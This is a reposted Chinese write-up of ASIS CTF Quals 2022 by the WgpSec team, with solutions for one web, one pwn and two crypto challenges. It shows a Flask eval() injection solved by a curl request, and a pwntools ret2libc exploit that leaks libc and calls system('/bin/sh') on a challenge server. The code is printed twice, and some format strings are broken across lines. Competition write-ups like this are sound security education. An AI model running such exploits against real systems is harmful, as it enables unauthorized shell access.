# ASIS CTF Quals 2022 WP

> 原文: https://www.ctfiot.com/63407.html
> ID: 63407

点击蓝字

关注我们

声明

本文作者：CTF战队本文字数：7700

阅读时长：20分钟

附件/链接：点击查看原文下载

本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载

前言

比赛信息

https://asisctf.com

2022-10-14 22:00 ~ 2022-10-15 22:00

关注公众号回复 ASIS CTF Quals 2022 获取比赛附件

WEB

Beginner ducks

题目源码：

#!/usr/bin/env python3
from flask import Flask,request,Response
import random
import re

app = Flask(__name__)
availableDucks = ['duckInABag','duckLookingAtAHacker','duckWithAFreeHugsSign']
indexTemplate = None
flag = None

@app.route('/duck')
def retDuck():
    what = request.args.get('what')
    duckInABag = './images/e146727ce27b9ed172e70d85b2da4736.jpeg'
    duckLookingAtAHacker = './images/591233537c16718427dc3c23429de172.jpeg'
    duckWithAFreeHugsSign = './images/25058ec9ffd96a8bcd4fcb28ef4ca72b.jpeg'

    if(not what or re.search(r'[^A-Za-z.]',what)):
        return 'what?'

    with open(eval(what),'rb') as f:
        return Response(f.read(), mimetype='image/jpeg')

@app.route("/")
def index():
    return indexTemplate.replace('WHAT',random.choice(availableDucks))

with open('./index.html') as f:
    indexTemplate = f.read() 
with open('/flag.txt') as f:
    flag = f.read()

if(__name__ == '__main__'):
    app.run(port=8000)

只要让 eval 返回 /flag.txt 就可以了 最下面有一个打开 flag 文件的操作，同时存了文件描述符 f f 有一些方法那么 eval(“f.name”) 就可以返回 flag路径 curl http://ducks.asisctf.com:
8000/duck?what=f.name

Pwn

Baby scan I

%0s直接绕过即可

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

debug = 2
context(arch='amd64', endian='el', os='linux')
# context.terminal = ['tmux','splitw','-h', '-l', '100']
context.log_level = 'debug'

if debug == 1:
    p = process(['./chall'])
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('65.21.255.31', 13370)
    libc = ELF('libc.so.6', checksec=False)
elf = ELF('./chall', checksec=False)

p.sendlineafter(b'size: ', str(0).encode())

pd = b'a' * 0x48
pd += p64(next(elf.search(asm("pop rdi ; ret"))))
pd += p64(elf.got["puts"])
pd += p64(elf.plt["puts"])
pd += p64(elf.sym["main"])
p.sendlineafter(b'data: ', pd)

libc.address = u64(p.recv(6).ljust(8, b'x00')) - libc.sym['puts']

p.sendlineafter(b'size: ', str(0).encode())

# gdb.attach(p, 'b *0x40134Cnc')

pd = b'a' * 0x48
pd += p64(next(elf.search(asm("pop rdi ; ret"))) + 1)
pd += p64(next(elf.search(asm("pop rdi ; ret"))))
pd += p64(next(libc.search(b"/bin/sh")))
pd += p64(libc.sym["system"])
p.sendlineafter(b'data: ', pd)
p.interactive()

Misc

Lets start!

image.png

Crypto

Binned

考察的是（a+1）^n这样的式子展开，mod pubkey**3之后其实只会剩下最后三项，根据公式还原一下m即可

pubkey = 125004899806380680278294077957993138206121343727674199724251084023100054797391533591150992663742497532376954423241741439218367086541339504325939051995057848301514908377941815605487168789148131591458301036686411659334843972203243490288676763861925647147178902977362125434420265824374952540259396010995154324589
enc = 789849126571263315208956108629196540107771075292285804732934458641661099043398300667318883764744131397353851782194467024270666326116745519739176492710750437625345677766980300328542459318943175684941281413218985938348407537978884988013947538034827562329111515306723274989323212194585378159386585826998838542734955059450048745917640814983343040930383529332576453845724747105810109832978045135562492851617884175410194781236450629682032219153517122695586503298477875749138129517477339813480115293124316913331705913455692462482942654717828006590051944205639923326375814299624264826939725890226430388059890231323791398412019416647826367964048142887158552454494856771139750458462334678907791079639005383932256589768726730285409763583606927779418528562990619985840033479201147509241313757191997545174262930707521451438204766627975109619779824255444258160
import sympy
import gmpy2
from Crypto.Util.number import *
h=(enc-1)-pubkey
c=h//pubkey//pubkey
c=c*2
c1=10054489678067822115481371335232343974958463063132871933014628812175566812121897618218465084557664288954026584252796
print(long_to_bytes(c1+1))
#ASIS{8!N0miaL_3XpAn5iOn_Us4G3_1N_cRyp7o_9rApHy!}

Chaffymasking

选取合适的salt，当salt为128位时，并且前半部分和后半部分不相同，即可跳过生成过程中随机数的加入，达到还原out_1,out_2的目的，然后异或还原flag即可

import numpy as np
import os, sys
import binascii
from Crypto.Util.number import *

def pad(inp, length):
    result = inp + os.urandom(length - len(inp))
    return result

def byte_xor(a, b):
    return bytes(_a ^ _b for _a, _b in zip(a, b))

def chaffy_mask(salt, LTC, m, n):
    q = n ** 2
    half1_salt = salt[:m // 8]
    half2_salt = salt[m // 8:]
    xor_salts = int.from_bytes(byte_xor(half1_salt, half2_salt), "big")
    if xor_salts == 0:
        half1_salt = byte_xor(half1_salt, os.urandom(m))
    half1_binStr = "{:
08b}".format(int(half1_salt.hex(), 16))
    if (len(half1_binStr) < m):
        half1_binStr = "0" * (m - len(half1_binStr) % m) + half1_binStr
    half2_binStr = "{:
08b}".format(int(half2_salt.hex(), 16))
    if (len(half2_binStr) < m):
        half2_binStr = "0" * (m - len(half2_binStr) % m) + half2_binStr
    vec_1 = np.array(list(half1_binStr), dtype=int)
    vec_1 = np.reshape(vec_1, (m, 1))
    vec_2 = np.array(list(half2_binStr), dtype=int)
    vec_2 = np.reshape(vec_2, (m, 1))
    out_1 = LTC.dot(vec_1) % q
    out_2 = LTC.dot(vec_2) % q

    return out_1,out_2
m, n = 512, 64
IVK = [
 3826, 476, 3667, 2233, 1239, 1166, 2119, 2559, 2376, 1208, 2165, 2897, 830, 529, 346, 150, 2188, 4025, 
 3667, 1829, 3987, 952, 3860, 2574, 959, 1394, 1481, 2822, 3794, 2950, 1190, 777, 604, 82, 49, 710, 1765, 
 3752, 2970, 952, 803, 873, 2647, 2643, 1096, 1202, 2236, 1492, 3372, 2106, 1868, 535, 161, 3143, 3370, 
 1, 1643, 2147, 2368, 3961, 1339, 552, 2641, 3222, 2505, 3449, 1540, 2024, 618, 1904, 314, 1306, 3173, 
 4040, 1488, 1339, 2545, 2167, 394, 46, 3169, 897, 4085, 4067, 3461, 3444, 118, 3185, 2267, 3239, 3612, 
 2775, 580, 3579, 3623, 1721, 189, 650, 2755, 1434, 35, 3167, 323, 589, 3410, 652, 2746, 2787, 3665, 828, 
 3200, 1450, 3147, 720, 3741, 1055, 505, 2929, 1423, 3629, 3, 1269, 4066, 125, 2432, 3306, 4015, 2350, 
 2154, 2623, 1304, 493, 763, 1765, 2608, 695, 30, 2462, 294, 3656, 3231, 3647, 3776, 3457, 2285, 2992, 
 3997, 603, 2342, 2283, 3029, 3299, 1690, 3281, 3568, 1927, 2909, 1797, 1675, 3245, 2604, 1272, 1146, 
 3301, 13, 3712, 2691, 1097, 1396, 3694, 3866, 2066, 1946, 3476, 1182, 3409, 3510, 2920, 2743, 1126, 2154, 
 3447, 1442, 2021, 1748, 1075, 1439, 3932, 3438, 781, 1478, 1708, 461, 50, 1881, 1353, 2959, 1225, 1923, 
 1414, 4046, 3416, 2845, 1498, 4036, 3899, 3878, 766, 3975, 1355, 2602, 3588, 3508, 3660, 3237, 3018, 
 1619, 2797, 1823, 1185, 3225, 1270, 87, 979, 124, 1239, 1763, 2672, 3951, 984, 869, 3897, 327, 912, 1826, 
 3354, 1485, 2942, 746, 833, 3968, 1437, 3590, 2151, 1523, 98, 164, 3119, 1161, 3804, 1850, 3027, 1715, 
 3847, 2407, 2549, 467, 2029, 2808, 1782, 1134, 1953, 47, 1406, 3828, 1277, 2864, 2392, 3458, 2877, 1851, 
 1033, 798, 2187, 54, 2800, 890, 3759, 4085, 3801, 3128, 3788, 2926, 1983, 55, 2173, 2579, 904, 1019, 
 2108, 3054, 284, 2428, 2371, 2045, 907, 1379, 2367, 351, 3678, 1087, 2821, 152, 1783, 1993, 3183, 1317, 
 2726, 2609, 1255, 144, 2415, 2498, 721, 668, 355, 94, 1997, 2609, 1945, 3011, 2405, 713, 2811, 4076, 
 2367, 3218, 1353, 3957, 2056, 881, 3420, 1994, 1329, 892, 1577, 688, 134, 371, 774, 3855, 1461, 1536, 
 1824, 1164, 1675, 46, 1267, 3652, 67, 3816, 3169, 2116, 3930, 2979, 3166, 3944, 2252, 2988, 34, 873, 
 1643, 1159, 2822, 1235, 2604, 888, 2036, 3053, 971, 1585, 2439, 2599, 1447, 1773, 984, 261, 3233, 2861, 
 618, 465, 3016, 3081, 1230, 1027, 3177, 459, 3041, 513, 1505, 3410, 3167, 177, 958, 2118, 326, 31, 2663, 
 2026, 2549, 3026, 2364, 1540, 3236, 2644, 4050, 735, 280, 798, 169, 3808, 2384, 3497, 1759, 2415, 3444, 
 1562, 3472, 1151, 1984, 2454, 3167, 1538, 941, 1561, 3071, 845, 2824, 58, 1467, 3807, 2191, 1858, 106, 
 3847, 1326, 3868, 2787, 1624, 795, 3214, 1932, 3496, 457, 2595, 3043, 772, 2436, 2160, 3428, 2005, 2597, 
 1932, 101, 3528, 1698, 3663, 900, 3298, 1872, 1179, 3987, 3695, 3561, 1762, 3785, 3005, 2574, 6, 1524, 
 2738, 1753, 2350, 558, 800, 3782, 722, 886, 2176, 3050, 221, 1925, 564, 1271, 2535, 3113, 1310, 2098, 
 3011, 964, 3281, 6, 1326, 741, 189, 2632, 373, 1176, 548, 64, 1445, 2376, 1524, 2690, 1316, 2304, 1336, 
 2257, 3227, 2542, 3911, 3460]
LTC = np.zeros([n, m], dtype=(int))

LTC[0,:] = IVK
for i in range(1, n):
    for j in range(m // n + 1):
        LTC[i, j * n:(j + 1) * n] = np.roll(IVK[j * n:(j + 1) * n], i)
salt=b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaazzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz'
o1,o2=chaffy_mask(salt,LTC,m,n)
FLAG = 'd57ebb6a38d3a8d3e044915c1cfda8d4f149ad5122eca1f8f7429e552aeca0c8fa729b4d1ce8a8d4cb5e9d562cf0a6c8fb429d562cf0a6c8fb72975830c6e8da'
c=''
for i in range(len(FLAG)//2):
   x=int(FLAG[i*2:i*2+2],16)
   c+=chr((o1[i]^o2[i]^x)%256)
print(c)
#ASIS{Lattice_based_hash_collision_it_was_sooooooooooooooo_easY!}

后记

想加入CTF战队的师傅可以发送简历至

match#wgpsec.org(#换成@)

作者

CTF战队

扫描关注公众号回复加群

和师傅们一起讨论研究~

长

按

关

注

WgpSec狼组安全团队

微信号：wgpsec

Twitter：@wgpsec


```
#!/usr/bin/env python3
from flask import Flask,request,Response
import random
import re

app = Flask(__name__)
availableDucks = ['duckInABag','duckLookingAtAHacker','duckWithAFreeHugsSign']
indexTemplate = None
flag = None

@app.route('/duck')
def retDuck():
    what = request.args.get('what')
    duckInABag = './images/e146727ce27b9ed172e70d85b2da4736.jpeg'
    duckLookingAtAHacker = './images/591233537c16718427dc3c23429de172.jpeg'
    duckWithAFreeHugsSign = './images/25058ec9ffd96a8bcd4fcb28ef4ca72b.jpeg'

    if(not what or re.search(r'[^A-Za-z.]',what)):
        return 'what?'

    with open(eval(what),'rb') as f:
        return Response(f.read(), mimetype='image/jpeg')

@app.route("/")
def index():
    return indexTemplate.replace('WHAT',random.choice(availableDucks))

with open('./index.html') as f:
    indexTemplate = f.read() 
with open('/flag.txt') as f:
    flag = f.read()

if(__name__ == '__main__'):
    app.run(port=8000)
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

debug = 2
context(arch='amd64', endian='el', os='linux')
# context.terminal = ['tmux','splitw','-h', '-l', '100']
context.log_level = 'debug'

if debug == 1:
    p = process(['./chall'])
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('65.21.255.31', 13370)
    libc = ELF('libc.so.6', checksec=False)
elf = ELF('./chall', checksec=False)

p.sendlineafter(b'size: ', str(0).encode())

pd = b'a' * 0x48
pd += p64(next(elf.search(asm("pop rdi ; ret"))))
pd += p64(elf.got["puts"])
pd += p64(elf.plt["puts"])
pd += p64(elf.sym["main"])
p.sendlineafter(b'data: ', pd)

libc.address = u64(p.recv(6).ljust(8, b'x00')) - libc.sym['puts']

p.sendlineafter(b'size: ', str(0).encode())

# gdb.attach(p, 'b *0x40134Cnc')

pd = b'a' * 0x48
pd += p64(next(elf.search(asm("pop rdi ; ret"))) + 1)
pd += p64(next(elf.search(asm("pop rdi ; ret"))))
pd += p64(next(libc.search(b"/bin/sh")))
pd += p64(libc.sym["system"])
p.sendlineafter(b'data: ', pd)
p.interactive()
pubkey = 125004899806380680278294077957993138206121343727674199724251084023100054797391533591150992663742497532376954423241741439218367086541339504325939051995057848301514908377941815605487168789148131591458301036686411659334843972203243490288676763861925647147178902977362125434420265824374952540259396010995154324589
enc = 789849126571263315208956108629196540107771075292285804732934458641661099043398300667318883764744131397353851782194467024270666326116745519739176492710750437625345677766980300328542459318943175684941281413218985938348407537978884988013947538034827562329111515306723274989323212194585378159386585826998838542734955059450048745917640814983343040930383529332576453845724747105810109832978045135562492851617884175410194781236450629682032219153517122695586503298477875749138129517477339813480115293124316913331705913455692462482942654717828006590051944205639923326375814299624264826939725890226430388059890231323791398412019416647826367964048142887158552454494856771139750458462334678907791079639005383932256589768726730285409763583606927779418528562990619985840033479201147509241313757191997545174262930707521451438204766627975109619779824255444258160
import sympy
import gmpy2
from Crypto.Util.number import *
h=(enc-1)-pubkey
c=h//pubkey//pubkey
c=c*2
c1=10054489678067822115481371335232343974958463063132871933014628812175566812121897618218465084557664288954026584252796
print(long_to_bytes(c1+1))
#ASIS{8!N0miaL_3XpAn5iOn_Us4G3_1N_cRyp7o_9rApHy!}
import numpy as np
import os, sys
import binascii
from Crypto.Util.number import *

def pad(inp, length):
    result = inp + os.urandom(length - len(inp))
    return result

def byte_xor(a, b):
    return bytes(_a ^ _b for _a, _b in zip(a, b))

def chaffy_mask(salt, LTC, m, n):
    q = n ** 2
    half1_salt = salt[:m // 8]
    half2_salt = salt[m // 8:]
    xor_salts = int.from_bytes(byte_xor(half1_salt, half2_salt), "big")
    if xor_salts == 0:
        half1_salt = byte_xor(half1_salt, os.urandom(m))
    half1_binStr = "{:
08b}".format(int(half1_salt.hex(), 16))
    if (len(half1_binStr) < m):
        half1_binStr = "0" * (m - len(half1_binStr) % m) + half1_binStr
    half2_binStr = "{:
08b}".format(int(half2_salt.hex(), 16))
    if (len(half2_binStr) < m):
        half2_binStr = "0" * (m - len(half2_binStr) % m) + half2_binStr
    vec_1 = np.array(list(half1_binStr), dtype=int)
    vec_1 = np.reshape(vec_1, (m, 1))
    vec_2 = np.array(list(half2_binStr), dtype=int)
    vec_2 = np.reshape(vec_2, (m, 1))
    out_1 = LTC.dot(vec_1) % q
    out_2 = LTC.dot(vec_2) % q

    return out_1,out_2
m, n = 512, 64
IVK = [
 3826, 476, 3667, 2233, 1239, 1166, 2119, 2559, 2376, 1208, 2165, 2897, 830, 529, 346, 150, 2188, 4025, 
 3667, 1829, 3987, 952, 3860, 2574, 959, 1394, 1481, 2822, 3794, 2950, 1190, 777, 604, 82, 49, 710, 1765, 
 3752, 2970, 952, 803, 873, 2647, 2643, 1096, 1202, 2236, 1492, 3372, 2106, 1868, 535, 161, 3143, 3370, 
 1, 1643, 2147, 2368, 3961, 1339, 552, 2641, 3222, 2505, 3449, 1540, 2024, 618, 1904, 314, 1306, 3173, 
 4040, 1488, 1339, 2545, 2167, 394, 46, 3169, 897, 4085, 4067, 3461, 3444, 118, 3185, 2267, 3239, 3612, 
 2775, 580, 3579, 3623, 1721, 189, 650, 2755, 1434, 35, 3167, 323, 589, 3410, 652, 2746, 2787, 3665, 828, 
 3200, 1450, 3147, 720, 3741, 1055, 505, 2929, 1423, 3629, 3, 1269, 4066, 125, 2432, 3306, 4015, 2350, 
 2154, 2623, 1304, 493, 763, 1765, 2608, 695, 30, 2462, 294, 3656, 3231, 3647, 3776, 3457, 2285, 2992, 
 3997, 603, 2342, 2283, 3029, 3299, 1690, 3281, 3568, 1927, 2909, 1797, 1675, 3245, 2604, 1272, 1146, 
 3301, 13, 3712, 2691, 1097, 1396, 3694, 3866, 2066, 1946, 3476, 1182, 3409, 3510, 2920, 2743, 1126, 2154, 
 3447, 1442, 2021, 1748, 1075, 1439, 3932, 3438, 781, 1478, 1708, 461, 50, 1881, 1353, 2959, 1225, 1923, 
 1414, 4046, 3416, 2845, 1498, 4036, 3899, 3878, 766, 3975, 1355, 2602, 3588, 3508, 3660, 3237, 3018, 
 1619, 2797, 1823, 1185, 3225, 1270, 87, 979, 124, 1239, 1763, 2672, 3951, 984, 869, 3897, 327, 912, 1826, 
 3354, 1485, 2942, 746, 833, 3968, 1437, 3590, 2151, 1523, 98, 164, 3119, 1161, 3804, 1850, 3027, 1715, 
 3847, 2407, 2549, 467, 2029, 2808, 1782, 1134, 1953, 47, 1406, 3828, 1277, 2864, 2392, 3458, 2877, 1851, 
 1033, 798, 2187, 54, 2800, 890, 3759, 4085, 3801, 3128, 3788, 2926, 1983, 55, 2173, 2579, 904, 1019, 
 2108, 3054, 284, 2428, 2371, 2045, 907, 1379, 2367, 351, 3678, 1087, 2821, 152, 1783, 1993, 3183, 1317, 
 2726, 2609, 1255, 144, 2415, 2498, 721, 668, 355, 94, 1997, 2609, 1945, 3011, 2405, 713, 2811, 4076, 
 2367, 3218, 1353, 3957, 2056, 881, 3420, 1994, 1329, 892, 1577, 688, 134, 371, 774, 3855, 1461, 1536, 
 1824, 1164, 1675, 46, 1267, 3652, 67, 3816, 3169, 2116, 3930, 2979, 3166, 3944, 2252, 2988, 34, 873, 
 1643, 1159, 2822, 1235, 2604, 888, 2036, 3053, 971, 1585, 2439, 2599, 1447, 1773, 984, 261, 3233, 2861, 
 618, 465, 3016, 3081, 1230, 1027, 3177, 459, 3041, 513, 1505, 3410, 3167, 177, 958, 2118, 326, 31, 2663, 
 2026, 2549, 3026, 2364, 1540, 3236, 2644, 4050, 735, 280, 798, 169, 3808, 2384, 3497, 1759, 2415, 3444, 
 1562, 3472, 1151, 1984, 2454, 3167, 1538, 941, 1561, 3071, 845, 2824, 58, 1467, 3807, 2191, 1858, 106, 
 3847, 1326, 3868, 2787, 1624, 795, 3214, 1932, 3496, 457, 2595, 3043, 772, 2436, 2160, 3428, 2005, 2597, 
 1932, 101, 3528, 1698, 3663, 900, 3298, 1872, 1179, 3987, 3695, 3561, 1762, 3785, 3005, 2574, 6, 1524, 
 2738, 1753, 2350, 558, 800, 3782, 722, 886, 2176, 3050, 221, 1925, 564, 1271, 2535, 3113, 1310, 2098, 
 3011, 964, 3281, 6, 1326, 741, 189, 2632, 373, 1176, 548, 64, 1445, 2376, 1524, 2690, 1316, 2304, 1336, 
 2257, 3227, 2542, 3911, 3460]
LTC = np.zeros([n, m], dtype=(int))

LTC[0,:] = IVK
for i in range(1, n):
    for j in range(m // n + 1):
        LTC[i, j * n:(j + 1) * n] = np.roll(IVK[j * n:(j + 1) * n], i)
salt=b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaazzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz'
o1,o2=chaffy_mask(salt,LTC,m,n)
FLAG = 'd57ebb6a38d3a8d3e044915c1cfda8d4f149ad5122eca1f8f7429e552aeca0c8fa729b4d1ce8a8d4cb5e9d562cf0a6c8fb429d562cf0a6c8fb72975830c6e8da'
c=''
for i in range(len(FLAG)//2):
   x=int(FLAG[i*2:i*2+2],16)
   c+=chr((o1[i]^o2[i]^x)%256)
print(c)
#ASIS{Lattice_based_hash_collision_it_was_sooooooooooooooo_easY!}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/8-1666006753.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/7-1666006753.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/5-1666006754.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/6-1666006754.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/0-1666006754.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/8-1666006755.gif)